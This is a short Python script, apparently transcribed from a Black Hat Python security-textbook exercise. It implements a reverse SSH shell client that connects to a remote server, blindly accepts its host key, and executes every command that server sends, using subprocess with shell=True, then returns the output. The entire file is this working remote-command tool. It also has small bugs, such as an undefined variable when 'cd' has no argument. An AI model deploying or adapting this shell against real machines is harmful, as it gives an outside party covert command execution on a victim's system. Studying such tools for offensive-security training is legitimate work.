# FOUND ON PAGE 27 of BHP

import getpass
import os
import paramiko
import shlex        # https://docs.python.org/3/library/shlex.html
import subprocess

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    else:
        print(f'Command recieved was: {cmd}')

    x_cmd = ''
    cmd_to_exec = shlex.split(cmd)

    if len(cmd_to_exec) > 1:
        x_cmd = cmd_to_exec[0]
        x_attr = cmd_to_exec[1] 

    if x_cmd == 'cd':
        print('Trying to cd')

        cd_path = x_attr or '/home/'
        os.chdir(cd_path)
        cwd = os.getcwd() 
        return f'Changed directory to: {cwd}'
        
    if (x_cmd == 'cat') or (x_cmd == 'type'):
        # https://docs.python.org/3.10/library/subprocess.html?highlight=subprocess%20run#subprocess.run (below)
        # had to use different subprocess.run settings for the cat command
        cmd_result = subprocess.run(shlex.split(cmd), capture_output=True, text=True)

        if cmd_result.returncode == 0:
            return cmd_result.stdout
        else:
            return cmd_result.stderr + '\n'

    process_data = subprocess.run(shlex.split(cmd), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
    
    if process_data.returncode == 0:
        return process_data.stdout
        # return output
    else:
        return process_data.stderr


def ssh_command(ip, port, user, passwd, command):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = ssh_client.get_transport().open_session() # This is new from our last script
    if ssh_session.active: 
        #* https://docs.paramiko.org/en/stable/api/channel.html?highlight=open_session.active#paramiko.channel.Channel.active
        #* https://docs.paramiko.org/en/stable/api/client.html?highlight=get_transport#paramiko.client.SSHClient.get_transport
        ssh_session.send(command)
        print(ssh_session.recv(1024))

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    ssh_client.close()
                    break

                print(shlex.split(cmd))
                process_data = execute(cmd)
                print(process_data)
                ssh_session.send(process_data)
            except Exception as e:
                ssh_session.send(f'Error: {str(e)}')
        ssh_client.close()
    return

if __name__ == '__main__':
    # user = getpass.getuser()
    user = input('Enter username: ') or 'user'
    password = getpass.getpass() or 'secret'

    ip = input('Enter server IP: ') or '192.168.1.100'
    port = input('Enter server port: ') or 2222
    
ssh_command(ip, port=port, user=user, passwd=password, command='ClientConnected')